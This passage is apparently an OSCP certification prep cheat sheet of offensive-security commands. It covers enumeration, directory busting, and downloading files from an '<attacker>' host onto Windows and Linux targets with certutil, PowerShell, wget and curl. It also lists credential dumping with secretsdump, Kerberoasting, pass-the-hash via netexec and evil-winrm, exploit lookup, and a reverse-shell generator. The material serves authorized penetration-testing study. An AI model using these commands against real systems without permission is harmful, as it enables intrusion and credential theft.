### Enumeration

[](https://github.com/jeffaf/oscp-prep-checklist?utm_source=chatgpt.com#enumeration)

```shell
# Port scanning
nmap -sC -sV -oN scan.txt <target>
nmap -p- --min-rate 1000 <target>

# SMB
netexec smb <target> -u '' -p ''
smbclient -L //<target>/ -N
smbmap -H <target>

# LDAP
ldapsearch -x -H ldap://<target> -b "DC=domain,DC=local"

# SNMP
snmp-check <target>
```
---
### Web

[](https://github.com/jeffaf/oscp-prep-checklist?utm_source=chatgpt.com#web)

```shell
# Directory busting
feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Know your webshells
ls /usr/share/webshells/
# php, asp, aspx, jsp: know which to use when
```
---
### File Transfers

[](https://github.com/jeffaf/oscp-prep-checklist?utm_source=chatgpt.com#file-transfers)

```shell
# HTTP server (attacker)
python3 -m http.server 80

# SMB server (attacker)
impacket-smbserver share . -smb2support

# Download on Windows
certutil -urlcache -f http://<attacker>/file.exe file.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<attacker>/file.exe','file.exe')"
iwr -uri http://<attacker>/file.exe -outfile file.exe

# Download on Linux
wget http://<attacker>/file.sh
curl http://<attacker>/file.sh -o file.sh
```
---
### Impacket Suite (Know These)

[](https://github.com/jeffaf/oscp-prep-checklist?utm_source=chatgpt.com#impacket-suite-know-these)

```shell
psexec domain/user:password@<target>
wmiexec domain/user:password@<target>
smbexec domain/user:password@<target>
secretsdump domain/user:password@<target>
GetUserSPNs -request domain/user:password -dc-ip <dc>
```
---
### netexec

[](https://github.com/jeffaf/oscp-prep-checklist?utm_source=chatgpt.com#netexec)

```shell
netexec smb <target> -u user -p pass
netexec smb <target> -u user -p pass --shares
netexec smb <target> -u user -p pass -x "whoami"
netexec smb <target> -u user -H <hash>  # pass the hash
netexec winrm <target> -u user -p pass
```
---
### RDP & winrm (you will see this.)
[](https://github.com/jeffaf/oscp-prep-checklist?utm_source=chatgpt.com#rdp--winrm-you-will-see-this)
```shell
# RDP
xfreerdp /u:username /p:'password' /v:<target>

# Evil-WinRM (port 5985)
evil-winrm -i <target> -u user -p pass
evil-winrm -i <target> -u user -p pass -S  # port 5986 (SSL)
evil-winrm -i <target> -u user -H <ntlmhash>  # pass the hash

# web remote
gotohttp
```

---
### SMB

[](https://github.com/jeffaf/oscp-prep-checklist?utm_source=chatgpt.com#smb)

```shell
# smbclient
smbclient -L //<target>  # list shares
smbclient //<target>/<share>
smbclient //<target>/<share> -U <username>
smbclient //<target>/<share> -U domain/username

# smbmap
smbmap -H <target>
smbmap -H <target> -u <username> -p <password>
smbmap -H <target> -u <username> -p <password> -d <domain>
smbmap -H <target> -u <username> -p <password> -r <share>
```
---
### LDAP & RPC

[](https://github.com/jeffaf/oscp-prep-checklist?utm_source=chatgpt.com#ldap--rpc)

```shell
# ldapsearch
ldapsearch -x -H ldap://<target> -b "DC=domain,DC=local"
ldapsearch -x -H ldap://<target> -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local"

# rpcclient
rpcclient -U="user" <target>
rpcclient -U="" <target>  # anonymous login
```
---
### Exploit Finder

[](https://github.com/jeffaf/oscp-prep-checklist?utm_source=chatgpt.com#exploit-finder)

```shell
searchsploit <service_name>
searchsploit -m <exploit_id>  # copy to current dir
```
---
### Reverse Shells

[](https://github.com/jeffaf/oscp-prep-checklist?utm_source=chatgpt.com#reverse-shells)

- **revshells.com**: quick reverse shell generator for all languages/formats